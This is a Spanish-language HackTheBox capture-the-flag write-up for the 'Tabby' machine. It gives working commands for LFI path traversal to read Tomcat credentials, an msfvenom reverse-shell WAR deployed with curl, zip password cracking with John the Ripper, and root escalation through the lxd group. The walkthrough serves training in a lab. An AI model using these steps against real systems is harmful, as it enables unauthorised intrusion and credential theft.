---
title: Tabby
published: 2025-08-09
image: "./logo.png"
tags: [Easy, LFI, Abusing Tomcat, LXC Exploitation, eWPT, OSCP, eJPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Local File Inclusion (LFI)
- Abusing Tomcat Virtual Host Manager
- Abusing Tomcat Text-Based Manager - Deploy Malicious War (Curl Method)
- LXC Exploitation (Privilege Escalation)

### Preparación

- eWPT
- OSCP (Escalada)
- eJPT (Intrusión)

***

## Reconocimiento

### Nmap

#### SSH (22)

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
```

#### Apache (80)

```
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mega Hosting
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

#### Apache Tomcat (8080)

```
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Puerto 8080

Como hemos visto anteriormente, en este puerto corre un **Apache Tomcat**.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDmIy37qO1E5ujY8ISy1E%2Fimage.png?alt=media&#x26;token=c4d75b78-676f-4bbf-9840-173c51c57058" alt=""><figcaption></figcaption></figure>

Podemos ver lo que parece la documentación por defecto. Vamos ahora al otro puerto.

### Puerto 80

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FrIutb7QcU4Vu3h4Ui8Jx%2Fimage.png?alt=media&#x26;token=e443bd0b-3e79-47b7-8645-1e68b7ca19e4" alt=""><figcaption></figcaption></figure>

### LFI

Podemos ver una página web normal y corriente, pero llama la atención que si le damos a "Read our statement..." nos redirige a [`http://megahosting.htb/news.php?file=statement`](http://megahosting.htb/news.php?file=statement) . Que si probamos un poco vemos que es vulnerable a **LFI**.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FLfCdqFTkRJZ6eExiEc91%2Fimage.png?alt=media&#x26;token=61f8b2a0-f2d7-4387-91dd-57ef9e9d9caf" alt=""><figcaption></figcaption></figure>

Probando rutas del Tomcat, la única que funciona es:

```
view-source:http://10.10.10.194/news.php?file=../../../../../../../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FxYmxEUVVp0c7UXRx2OLl%2Fimage.png?alt=media&#x26;token=5510106c-7b72-4bac-a221-a930d2d5e009" alt=""><figcaption></figcaption></figure>

## Explotación

Podemos ver ya un usuario y una contraseña. Sabiendo esto y viendo que tiene el permiso <mark style="color:purple;">manager-script</mark>, podemos entablar una reverse shell, pero primero vamos a crearla:

```
msfvenom -p java/shell_reverse_tcp lhost=<IP> lport=<PORT> -f war -o pwn.war
```

Una vez la tengamos, la subiremos:

```
curl -v -u <user>:$pass --upload-file pwn.war “http://10.10.10.194:8080/manager/text/deploy?path=/foo&update=true"
```

Ahora nos pondremos a la escucha con **netcat** y abriremos la shell [`http://10.10.10.194:8080/foo`](http://10.10.10.194:8080/foo) .

```
tomcat@tabby:/$ whoami
tomcat
```

Ya tendríamos una reverse shell. La haremos interactiva con la siguiente secuencia:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

Viendo un poco lo que hay, nos encontramos con un backup comprimido en zip:

```
tomcat@tabby:/var/www/html/files$ ls -la
total 36
drwxr-xr-x 4 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 4 root root 4096 Aug 19  2021 ..
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Aug 19  2021 archive
drwxr-xr-x 2 root root 4096 Aug 19  2021 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16  2020 statement
```

Si lo descargamos nos pide una contraseña:

```
❯ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password:
```

### Zip2john

Usaremos la herramienta **zip2jhon** para convertirlo en un hash:

```
zip2john 16162020_backup.zip > hash.txt
```

### John The Ripper

Y ahora con **jhontheripper** lo craackearemos con **rockyou**:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:01 DONE (2025-08-08 23:26) 0.6993g/s 7246Kp/s 7246Kc/s 7246KC/s adornadis..adhi1411
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Y ya tendremos la contraseña del .zip, al no ver nada interesante dentro del zip, podríamos intentar a usar esta contraseña con el usuario **ash**:

```
tomcat@tabby:/home$ su ash
Password: 
ash@tabby:/home$ 
```

Efectivamente, funciona, por lo que ya tendremos la **user flag**:

```
ash@tabby:~$ cat user.txt 
4bf2198898373cd57...
```

## Escalada de privilegios

Usando la herramienta **linenum.sh**, podemos ver que el usuario **ash** está en un grupo extraño llamado **lxd**:

```
[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Buscando información relacionada a esto, encontramos que los usuarios con este grupo pueden crear e inicar containers, además de que encontrarmos un exploit:

```
❯ searchsploit lxd

----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                                                                            | linux/local/46978.sh
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### LXD

Seguiremos los pasos del script para poder conseguir root:

```
# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
```

```
ash@tabby:~$ bash 46978.sh -f alpine-v3.22-x86_64-20250809_0956.tar.gz 
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

[*] Listing images...

+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| alpine | 212b7bcbc5ee | no     | alpine v3.22 (20250809_09:56) | x86_64       | CONTAINER | 3.85MB | Aug 9, 2025 at 8:09am (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
Creating privesc
Device giveMeRoot added to privesc
```

Y si accedemos a **/mnt/root** tendremos la **root flag**:

```
~ # cd /mnt
/mnt # ls
root
/mnt # cd root/
/mnt/root # ls
bin         etc         lib64       mnt         run         sys
boot        home        libx32      opt         sbin        tmp
cdrom       lib         lost+found  proc        snap        usr
dev         lib32       media       root        srv         var
/mnt/root # cd root/
/mnt/root/root # ls
root.txt  snap
/mnt/root/root # cat root.txt 
c71b3dcb742ac1442...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/259)

---